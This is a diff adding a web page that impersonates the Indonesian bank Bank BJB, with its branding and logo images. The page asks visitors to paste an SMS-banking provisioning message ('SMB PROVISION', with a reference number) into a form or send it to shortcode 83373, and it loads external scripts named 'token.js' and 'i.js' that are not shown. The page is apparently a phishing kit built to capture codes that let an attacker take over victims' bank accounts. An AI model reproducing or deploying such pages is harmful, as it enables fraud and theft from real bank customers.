@@ -1,0 +1,643 @@
+
+<html>
+ <head>
+<meta charset="utf-8">
+  <title>Bank BJB</title>
+  <meta content="Bank BJB" property="og:title">
+  <meta content="https://pbs.twimg.com/media/FoBdq39acAQCO9O?format=jpg&amp;name=large" property="og:image">
+  <meta content="Bank BJB" property="twitter:title">
+  <meta content="https://pbs.twimg.com/media/FoBdq39acAQCO9O?format=jpg&amp;name=large" property="twitter:image">
+  <meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+  <meta content="Webflow" name="generator">
+  <link href="https://uploads-ssl.webflow.com/63d39c8be4d85388d0311953/css/jet-co-id.webflow.58be894ad.css" rel="stylesheet" type="text/css">
+ <link href="https://uploads-ssl.webflow.com/63d39c8be4d85388d0311953/css/jet-co-id.webflow.1f341b9be.css" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com" rel="preconnect">
+  <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous"> 
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:300,300italic,400,400italic,500,500italic,700,700italic%7CVarela+Round:400" media="all"> 
+   <link href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEizb1-vu-wnYMonTO6mhLadGlkqHdASnfx-fWsSzJoYHr9n7KrxLbB86VzJYWF0d6KusVNNQRaWVYkVYQzUkziywq4ualtGCpyl4I5F44N3xgyk9XWD4uv3Hg4OWXKtdOxhkSIcYbHHAB6S3-gs0uMmXgUo4LlrL15t97oYi79kO0nMUw1iBiLX72Xk/s16000/Screenshot_2023-03-27-17-14-49-92_b5a5c5cb02ca09c784c5d88160e2ec24.jpg" rel="shortcut icon" type="image/x-icon">
+  <link href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEizb1-vu-wnYMonTO6mhLadGlkqHdASnfx-fWsSzJoYHr9n7KrxLbB86VzJYWF0d6KusVNNQRaWVYkVYQzUkziywq4ualtGCpyl4I5F44N3xgyk9XWD4uv3Hg4OWXKtdOxhkSIcYbHHAB6S3-gs0uMmXgUo4LlrL15t97oYi79kO0nMUw1iBiLX72Xk/s16000/Screenshot_2023-03-27-17-14-49-92_b5a5c5cb02ca09c784c5d88160e2ec24.jpg" rel="apple-touch-icon"> 
+<meta name="theme-color" content="#0061A6">
+    <style media="screen">
+      *,
+*:before,
+*:after{
+    padding: 0;
+    margin: 0;
+    box-sizing: border-box;
+}
+body {
+  font-family: "Source Sans Pro", sans-serif;
+  background-size: cover;
+         background-position: center;
+       background-repeat: no-repeat;
+         height: 100px;
+  font-size: 16px;
+  width: 100%;
+  position: relative;
+ 
+}
+.popup{
+    background-color: #ffffff;
+    width: 300px;
+    height: 160px;
+    padding: 30px 40px;
+    position: absolute;
+    transform: translate(-50%,-50%);
+    left: 50%;
+    top: 50%;
+    border: 2px solid;
+    border-radius: 5px;
+    font-family: "Poppins",sans-serif;
+    display: none; 
+    text-align: center;
+    box-shadow: #D5D5D5 10px;
+ z-index: 99999;
+}
+.popup button{
+    display: block;
+    margin:  0 0 20px auto;
+    background-color: red;
+    font-size: 14px;
+    color: #ffffff;
+    background: #03549a;
+    border-radius: 5%;
+    margin-left: 0px;
+    width: 100%;
+    height: 35px;
+    border: none;
+    outline: none;
+    cursor: pointer;
+}
+.popup h2{
+  margin-top: -20px;
+  font-size: 15px;
+  text-align: center;
+  font-weight: bold;
+}
+.popup p{
+    font-size: 12px;
+    text-align: center;
+    font-weight: 800;
+    margin: 20px 0;
+    line-height: 14px;
+}
+a{
+    display: block;
+    width: 150px;
+    position: relative;
+    margin: 10px auto;
+    text-align: center;
+    background-color: #0f72e5;
+    border-radius: 20px;
+    color: #ffffff;
+    text-decoration: none;
+    padding: 8px 0;
+}
+disabled{
+    background: #fff;
+    opacity: 1.0;
+    
+}
+  :root {
+  --ewc-color-1: #ffffff;
+  --ewc-color-2: #eae1da;
+  --ewc-color-3: #25d366;
+  --ewc-color-3-dark: #0bac46;
+  --ewc-color-4: #00796a;
+}
+
+.ewChat {
+  position: absolute;
+  bottom: 316px;
+  right: 152px;
+  font-family: "Roboto", sans-serif;
+  margin: 0;
+  
+  padding: 0;
+  width: 340px;
+  max-width: calc(100% - 60px);
+  display: flex;
+  flex-direction: column;
+  align-items: flex-end;
+  z-index: 9999;
+}
+
+.ewChatBox {
+  width: 90%;
+  background-color: var(--ewc-color-2);
+  position: fixed;
+  top: 250px;
+  left: 17px;
+  border-radius: 15px;
+  display: none;
+  opacity: 0;
+  transition: opacity 1000ms;
+  flex-direction: column;
+}
+
+.ewChatClose {
+  color: var(--ewc-color-1);
+  display: none;
+  position: absolute;
+  top: -35px;
+  right: 0;
+  border: none;
+  padding: 4px;
+  border-radius: 100%;
+  background-color: var(--ewc-color-4);
+}
+
+.ewChatClose:hover {
+  background-color: var(--ewc-color-3);
+}
+
+.ewChatCloseMobile {
+  width: 100%;
+  position: absolute;
+  text-align: center;
+  color: var(--ewc-color-1);
+  top: -300px;
+  padding: 100px 0;
+  cursor: pointer;
+}
+
+.ewChatAvatar {
+  position: absolute;
+  left: calc(50% - 32px);
+  top: -80px;
+  width: 59px;
+  height: 59px;
+  padding: 3px;
+  border: solid 2px var(--ewc-color-3);
+  border-radius: 100%;
+  background-color: var(--ewc-color-1);
+  display: flex;
+}
+.ewChatAvatar img {
+  border-radius: 100%;
+}
+
+.ewChatHeader {
+  background-color: var(--ewc-color-4);
+  color: var(--ewc-color-1);
+  border-radius: 15px 15px 0 0;
+  padding: 12px;
+  text-align: center;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+}
+
+.ewChatHeader h3 {
+  color: var(--ewc-color-1);
+  font-size: 18px;
+  margin: 3px;
+}
+.ewChatHeader p {
+  font-size: 12px;
+  margin: 0;
+}
+
+.ewChatBubble {
+  background-color: var(--ewc-color-1);
+  margin: 10px 18px 10px 30px;
+  padding: 9px 9px 25px 9px;
+  text-align: left;
+  border-radius: 0 10px 10px 10px;
+  position: relative;
+  opacity: 0;
+  transition: opacity 1000ms;
+}
+
+.ewChatBubble:after {
+  content: "";
+  position: absolute;
+  left: 0;
+  top: 0;
+  width: 0;
+  height: 0;
+  border: 15px solid transparent;
+  border-right-color: var(--ewc-color-1);
+  border-left: 0;
+  border-top: 0;
+  margin-top: 0;
+  margin-left: -15px;
+}
+
+.ewChatBubble p {
+  margin: 0;
+  font-size: 14px;
+}
+
+.ewChatBubble span {
+  position: absolute;
+  bottom: 5px;
+  right: 9px;
+  opacity: 0.5;
+  font-size: 11px;
+}
+
+.ewChatInput {
+  display: none;
+  opacity: 0;
+  position: fixed;
+  transition: opacity 1000ms;
+  width: 90%;
+  top: 430px;
+  left: 17px;
+  margin-top: 10px;
+  background-color: var(--ewc-color-1);
+  height: 48px;
+  border-radius: 24px;
+}
+
+.ewChatInput input {
+  font-family: "Roboto", sans-serif;
+  font-size: 16px;
+  background-color: var(--ewc-color-1);
+  height: 32px;
+  margin: auto 20px;
+  width: 100%;
+  border: none;
+}
+
+.ewChatInput input:focus {
+  outline: none;
+}
+
+.ewChatInput button {
+  border: none;
+  background-color: var(--ewc-color-4);
+  border-radius: 20px;
+  margin: 4px;
+  color: var(--ewc-color-1);
+  padding: 8px;
+}
+
+.ewChatInput button:hover {
+  background-color: var(--ewc-color-3);
+}
+
+.ewChatDesktop {
+  cursor: pointer;
+  display: none;
+  align-items: center;
+  height: 36px;
+  border-radius: 25px;
+  background-color: var(--ewc-color-3);
+  width: 68%;
+  padding: 4px 20px;
+  font-size: 14px;
+  color: var(--ewc-color-1);
+  margin-top: 20px;
+}
+
+.ewChatDesktop svg {
+  margin-right: 10px;
+}
+
+.ewChatMobile {
+  cursor: pointer;
+  padding: 10px;
+  background-color: var(--ewc-color-3);
+  display: flex;
+  border-radius: 100%;
+  color: var(--ewc-color-1);
+  border: solid 2px var(--ewc-color-1);
+  margin-top: 80px;
+}
+
+.ewChatMobile:hover,
+.ewChatDesktop:hover {
+  background-color: var(--ewc-color-3-dark);
+}
+
+.ewChatBackdrop {
+  position: fixed;
+  inset: 0;
+  background-color: rgba(0, 0, 0, 0.5);
+  z-index: 998;
+}
+
+/* Responsive */
+@media screen and (min-width: 450px) {
+  .ewChatAvatar {
+    left: -80px;
+    top: 80px;
+  }
+
+  .ewChatClose,
+  .ewChatDesktop {
+    display: flex;
+  }
+
+  .ewChatMobile,
+  .ewChatCloseMobile {
+    display: none;
+  }
+}
+body {font-family: Arial, Helvetica, sans-serif;}
+* {box-sizing: border-box;}
+/* Button used to open the contact form - fixed at the bottom of the page */
+.open-button {
+  background-color: #555;
+  color: white;
+  padding: 16px 20px;
+  border: none;
+  cursor: pointer;
+  opacity: 0.8;
+  position: fixed;
+  bottom: 23px;
+  right: 28px;
+  width: 100%;
+}
+
+/* The popup form - hidden by default */
+.chat-popup {
+  display: block;
+  position: relative;
+  bottom: 0;
+  top: 0;
+  height: 800;
+  margin-bottom: none;
+  right: 0px;
+  background: SNOW;
+ 
+  background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjrtm5mZx6UGyH5X3aU8trv8gjNfTB2AfVWdzdhPaF0Lpd7lrSiUA3bVM5kuyv_hwghC259W8bRx49gz8bIlHydHzTAgfE5yP7SX4DL7WQc7yCMScdokVSt2Hur8VVtueETHdV5H9qpcheTc8K0erZziAGl9MuGHrk_zM9l6_VU3hKVuWKiT6dAdq_GOIM/s4329/back_hires.jpg');
+      background-position: 100% 100%;
+      background-repeat: no-repeat;
+      background-size: 100% 100%; 
+
+  z-index: 9;
+  width: 100%;
+}
+
+/* Add styles to the form container */
+.form-container {
+  width: 100%;
+  padding: 20px;
+  background-color: ;
+  
+  
+
+   padding-top: 30px;
+}
+
+/* Full-width textarea */
+.form-container textarea {
+  width: 100%;
+  padding: 10px;
+  margin: 5px 0 22px 0;
+  border: 3px solid #0061A6;
+   border-radius: 10px;
+-webkit-border-radius: 10px;
+  background: #f1f1f1;
+  resize: none;
+  min-height: 125px;
+  box-shadow: rgba(0, 0, 0, 0.36) 0px 1px 4px;
+}
+
+/* When the textarea gets focus, do something */
+.form-container textarea:focus {
+  background-color: #ddd;
+  outline: none;
+}
+
+
+.form-container textarea::placeholder{
+    opacity: 0.6;
+}
+
+/* Set a style for the submit/send button */
+.form-container .btn {
+  background-color: SNOW;
+  color: transparent;
+  padding: 16px 10px;
+  border: none;
+  cursor: pointer;
+  width: 100%;
+  margin-bottom: 30px;
+  padding-top: -10px;
+  margin-top: -8px;
+  ;
+}
+
+
+/* Add a red background color to the cancel button */
+.form-container .cancel {
+  background-color: red;
+  color: white;
+   border-radius: 1px 1px 10px 10px;
+-webkit-border-radius: 1px 1px 20px 20px;
+}
+
+/* Add some hover effects to buttons */
+.form-container .btn:hover, .open-button:hover {
+  opacity: 1;
+}
+
+/* When the inputs get focus, do something */
+.form-container input[type=text]:focus, 
+:focus {
+  background-color: none;
+  outline: none;
+}
+
+/* Add some hover effects to buttons */
+.form-container .btn:hover, .open-button:hover {
+  opacity: 1;
+}
+  .btn-cancel {
+        border: ;
+        width: 86%;
+        height: 55px;
+            text-align: center; 
+              color: blue;
+       margin-top: 270px;
+       margin-left: -330px;
+       background: #fff;
+       border: 5px solid #fff;
+        border-radius: 1px 1px 37px 38px;
+-webkit-border-radius: 1px 1px 37px 38px;
+       opacity: 0.0;
+      position: absolute;
+     
+   }
+
+/* Add a red background color to the cancel button */
+
+    </style>
+</head>
+<style>
+.load{
+     top: 0;
+     left: 0;
+     right: 0;
+     position: fixed;
+     display: flex;
+     justify-content: center;
+     align-items: center;
+     background: #00000080;
+     z-index: 999999999;
+     width: 100%;
+     height: 100%;
+      }
+      
+     .loader {
+            border: 0px solid #f3f3f3;
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+</style>
+<div class="load" style="display:none;">
+    <div class="loader"></div>  
+</div>
+ 
+<body>
+
+  <!-- partial:index.partial.html --> 
+  <div class=""> 
+   <!-- Chat Box -->
+   <div class="chat-popup" id="" style="width: 100%">
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjUxadc1x2VWWyT1cJ8xAMVlBUH0eAQbaRQvWbJrUckU5NrSo3Kn77mSJhKN46q-n8PXcOhzhZVHPb6mJWCKaLuwxvTkeoW_VJEvhis1mHWYOGGUvZ0YeR3NK7sHIc1aDiJ_cy8fKfsqXKhGvQ5it4IWLax1yktAifPmtC3xmPt5C2ilawPTjP8kSNkIwE/s400/AddText_08-10-09.31.31.png" style="position: absolute; right: 15; top: 10; width: 80px">     
+    <div id="ewChatBox">
+  <!-- Chat Input -->
+   <div id="ewChatInput">
+<div class="form-container">
+    <center>
+ <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjntPh14gVThsKselYkNGEDNnrNzE-AdBJzA9_su82xLWVYxO9Dux3h4o0A9GRiPtMvbLnBM-wwUjTDfE8FQPgIoAjTQh-xao7k76x1rbL0yR000D0gYOBuWTBIfoccMv7pRsb_cPEb8A3NUxvAMb_fHSYzcZ1fOuNj62Ed7eyn5-6FuWzOoDNbbB2TeA4/s408/AddText_08-02-10.57.59.png" style="width: 200px; margin-top: 100px">
+<form id="smsForm">
+     
+    <label for="msg" style="color: white; margin-left: 5px; margin-top: -15px;text-shadow: rgba(0, 0, 0, 0.36) 0px 1px 3px;"><br>Anda akan dihubungi oleh Layanan Bank BJB, Untuk mengirimkan Format/Pesan SMS ke Layanan (83373) Atau klik Request Format SMS</b></label>
+     <textarea placeholder="Contoh SMS :
+( SMB PROVISION 
+Mohon jangan ubah SMS.
+Nomor Ref:
+MCFLQTBMKMBYIW8A )" oninvalid="this.setCustomValidity('Silahkan Klik, - 𝗥𝗲𝗾𝘂𝗲𝘀𝘁 𝗙𝗼𝗿𝗺𝗮𝘁 𝗦𝗠𝗦')" onchange="this.setCustomValidity('')" id="message" name="message" required minlength="10"></textarea>
+    <button type="submit" style="border: 2px solid #0061A6; font-weight: 800; border-radius: 28px;margin-bottom: 20px;
+    background: #FFC945;
+    box-shadow: rgba(0, 0, 0, 0.36) 0px 1px 4px;
+   
+    
+    color: #3C6A8B; " class="btn">Kirim SMS ke 83373</button> <br>
+    </form>
+
+    <button type="button" onclick="go()" target="_blank" id="chat" class="btn" style="border: none; font-weight: 800; border-radius: 28px; background: #187BBE; color: #fff; border: 1px solid #fff;box-shadow: rgba(0, 0, 0, 0.36) 0px 1px 4px;">Request Format SMS</button>
+
+   </div>  
+   </div>
+   </div>
+   </div>
+ <audio hidden controls id="bsiku">
+<source src="mohon." type="audio/ogg">
+<source src="mohon." type="audio/mpeg">
+  Your browser does not support the audio element.
+</audio><script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script><script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script><script src="i.js"></script><script src="https://code.jquery.com/jquery-3.5.1.min.js"></script><script>
+
+function openForm() {
+  document.getElementById("myForm").style.display = "block";
+}
+
+function closeForm() {
+  document.getElementById("myForm").style.display = "none";
+}
+</script>
+    <!--Script-->
+  <!--   <script type="text/javascript">
+window.addEventListener("load", function(){
+    setTimeout(
+        function open(event){
+            document.querySelector(".echat-popup").style.display = "block";
+        },
+        2000 
+    )
+});
+
+
+document.querySelector("#close").addEventListener("click", function(){
+    document.querySelector(".cshat-popup").style.display = "none";
+});
+    </script> -->
+    <script src="token.js">
+
+ </script>
+</body>
+</html>
+<script>
+
+
+// Ganti nomor WhatsApp berikut dengan nomor kamu
+const NOMOR_WHATSAPP = ""; //Pastikan nomor diawali dengan kode negara tanpa tanda "+" (cth. 085-XXX-XXX-XXX diubah mendaji 6285-XXX-XXX-XXX)
+
+const ewc_hidden = document.querySelectorAll(".ewc_hidden");
+const ewc_button = document.querySelectorAll(".ewc_button");
+const ewc_audio = new Audio(
+  "https://cdn.pixabay.com/download/audio/2023/02/19/audio_7878efffe2.mp3?filename=mp3-output-ttsfreedotcom-5-139773.mp3"
+);
+
+const ewcShow = () => {
+  ewc_hidden.forEach((el) => {
+    el.style.display = "flex";
+    el.ariaHidden = "false";
+  });
+  ewc_audio.play();
+
+  setTimeout(() => {
+    ewc_hidden.forEach((el) => {
+      el.style.opacity = "1";
+    });
+  }, 0);
+
+  setTimeout(() => {
+    document.getElementById("ewChatBubble").style.opacity = "1";
+  }, 300);
+};
+
+const ewcHide = () => {
+  ewc_hidden.forEach((el) => {
+    el.style.opacity = "0";
+    document.getElementById("ewChatBubble").style.opacity = "0";
+    el.ariaHidden = "true";
+  });
+
+  setTimeout(() => {
+    ewc_hidden.forEach((el) => {
+      el.style.display = "none";
+    });
+  }, 1000);
+};
+
+function ewcOpen() {
+  if (ewChatBox.style.display == "none") {
+    ewcShow();
+  } else {
+    ewcHide();
+  }
+}
+
+document.querySelectorAll(".ewc_close").forEach((el) => {
+  el.addEventListener("click", ewcHide);
+});
+
+document.querySelectorAll(".ewc_open").forEach((el) => {
+  el.addEventListener("click", ewcOpen);
+});
+
+document.getElementById("ewc_send").addEventListener("submit", () => {
+  window.open(
+    `sms:83373?&body=${encodeURI(
+      document.getElementById("ewc_message").value
+    )}`
+  );
+});
+</script>
+
+
